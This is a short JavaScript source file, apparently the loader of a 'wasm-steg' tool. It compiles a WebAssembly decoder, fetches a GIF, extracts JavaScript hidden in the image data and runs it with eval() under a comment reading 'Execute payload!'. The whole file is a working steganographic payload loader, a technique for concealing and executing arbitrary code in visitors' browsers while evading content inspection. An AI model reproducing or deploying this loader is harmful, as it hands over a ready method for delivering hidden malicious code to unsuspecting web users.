/* load.js - wasm-steg javascript loader
 * Author: spacehen (Dylan Muller)
 */

// Use UintXArray for read/write to memory.
// Use array view to set VM memory.

function initRoutines(exports) {
    let env = exports.env;

    // Simple (SP) increment
    env.malloc = function (bytes) {
        let sp = env.STACKTOP;
        env.STACKTOP += bytes;
        return sp;
    }
    // Stack operations.
    env.stackSave = function () {
        return env.STACKTOP;
    }
    env.stackRestore = function (stackTop) {
        env.STACKTOP = stackTop;
    }
    // Execute payload!
    env.init_payload = function (ptr, size) {
        let array = new Uint8Array(env.memory.buffer, ptr, size);
        let string = '';

        for (let i = 0; i < size; i++) {
            string += String.fromCharCode(array[i]);
        }
        eval(string);
    }
}

(async () => {

    let imports = {};
    imports.env = {};

    // 64KiB VM
    imports.env.memory = new WebAssembly.Memory({ initial: 1 });
    imports.env.table = new WebAssembly.Table({ initial: 1, element: 'anyfunc' });
    imports.env.STACK_MAX = imports.env.memory.buffer.byteLength;

    // Initialize stack pointer.
    imports.env.__stack_pointer = new WebAssembly.Global({value: 'i32', mutable: true},
                                                         imports.env.STACK_MAX);

    imports.env.DYNAMICTOP_PTR = 0;

    // Set memory base.
    imports.env.__memory_base = 0;
    // Set table base.
    imports.env.__table_base = 0;

    // Initialize javascript routines
    // callable from C.
    initRoutines(imports);

    // Fetch image
    let response = await fetch('/decode.wasm');
    let buffer = await response.arrayBuffer();

    // Compile bytecode
    let module = await WebAssembly.compile(buffer);

    // Instantiate VM
    let vm = new WebAssembly.Instance(module, imports);
    // Fetch image data
    let r = await fetch('out.gif');
    let rb = await r.arrayBuffer();

    let env = imports.env;
    var blob = new Uint8Array(rb);
    const address = env.malloc(blob.length + 1);
    let data = new Uint8Array(env.memory.buffer, address, blob.length);
    data.set(blob, 0);
    // Decode image data!
    vm.exports.decode(address, blob.length);
  

})();
